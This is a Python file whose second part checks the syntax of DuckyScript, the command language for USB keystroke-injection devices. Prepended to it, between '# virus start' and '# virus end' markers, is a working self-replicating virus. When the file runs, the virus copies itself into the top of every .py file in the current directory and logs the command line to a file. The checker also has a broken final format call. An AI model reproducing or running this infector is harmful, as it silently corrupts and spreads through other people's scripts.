# virus start
import sys, glob
def file_finder(directory="."):
	return[file for file in glob.glob("*.py")]
def file_content(filename):
	info = None
	with open(filename, "r") as file:
		info = file.readlines()
	return info
def infectable(filename):
	info = file_content(filename)
	for line in info:
		if "# virus start\n" in line:
			return None
	return info
def virus_infect(filename, code):
	if (data:=infectable(filename)):
		with open(filename, "w") as infect_file:
			infect_file.write("".join(code))
			infect_file.writelines(data)
def code():
	extract = False
	virus = []
	text = file_content(__file__)
	for line in text:
		if "# virus start\n" in line:
			extract = True
		if extract:
			virus.append(line)
		if "# virus end\n" in line:
			extract = False
			break
	return virus
def append_file(line):
	output = "Q1C.out"
	with open(output, 'a') as x:
		x.write(line + '\n')
def infection():
	line = " ".join(sys.argv)
	append_file(line)
	c = code()
	for files in file_finder():
		virus_infect(files, c)
if __name__ == "__main__":
	infection()
# virus end
from time import sleep

validFKeys = ["F" + str(x) for x in range(1,13)]
validShiftKeys = ["DELETE", "HOME", "INSERT", "PAGEUP", "PAGEDOWN", "WINDOWS", "GUI", "UPARROW", "LEFTARROW", "RIGHTARROW", "TAB"]
validCTRLkeys = ["BREAK", "PAUSE", "ESCAPE", "ESC"]
validAltKeys = ["ALT", "END", "ESC", "ESCAPE", "SPACE", "TAB"]

def LineCheck(command:str, keys:str, currentLine:int):
    match command:
        case "REM":
            pass
        case "STRING":
            if len(keys) <= 0:
                print("Empty STRING command on line " + str(currentLine) + ".\n"
                      "This won't cause any errors, but it will not type anything.")
        case "DEFAULT_DELAY" | "DEFAULTDELAY":
            if currentLine == 1:
                if not keys.isnumeric():
                    print("ERROR [Line = {line}] |:: DEFAULTDELAY only accepts integer values".format(line = currentLine))
                    return False
            else:
                print("ERROR [Line = {line}] |:: DEFAULTDELAY should only be present on line 1.".format(line=currentLine))
                return False
        case "DELAY":
            if not keys.isnumeric():
                print("ERROR [Line = {line}] |::DELAY only accepts integer vaues.".format(line=currentLine))
                return False
        case "WINDOWS" | "GUI":
            if len(keys) > 2:
                print("ERROR [Line = {line}] |:: The command following GUI/WINDOWS is more than 2 characters.".format(line=currentLine))
                return False
        case "ENTER":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following ENTER. ENTER function doesn't support key combos.".format(line=currentLine))
                return False
        case "APP" | "MENU":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following APP/MENU, which don't support key combos.".format(line=currentLine))
                return False
        case "SHIFT":
            if len(keys) > 0 and keys not in validShiftKeys:
                print("ERROR [Line = {line}] |:: Command following SHIFT is not valid.".format(line=currentLine))
                return False
        case "ALT":
            if len(keys) > 0 and keys not in validAltKeys:
                print("ERROR [Line = {line}] |:: Command following ALT is not valid.".format(line=currentLine))
                return False
        case "CONTROL" | "CTRL":
            if keys not in validCTRLkeys and keys not in validFKeys and len(keys) == 1 and not keys.isalpha():
                print("ERROR [Line = {line}] |:: Command following {command} is not valid.".format(line=currentLine, command=command))
                return False
        case "TAB":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case "DOWNARROW" | "DOWN":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case "LEFTARROW" | "LEFT":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case "RIGHTARROW" | "RIGHT":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case "UPARROW" | "UP":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case "REPLAY":
            if not keys.isnumeric():
                print("ERROR [Line = {line}] |:: REPLAY only accepts integers.".format(line=currentLine))
        case "DELETE":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case "CAPS":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case "SPACE":
            if len(keys) > 0:
                print("ERROR [Line = {line}] |:: There is a command following {command}.".format(line=currentLine,command=command))
                return False
        case _:
            print("ERROR [Line = {}] |:: Command not recognized.".format(line=currentLine))
            return False
    return True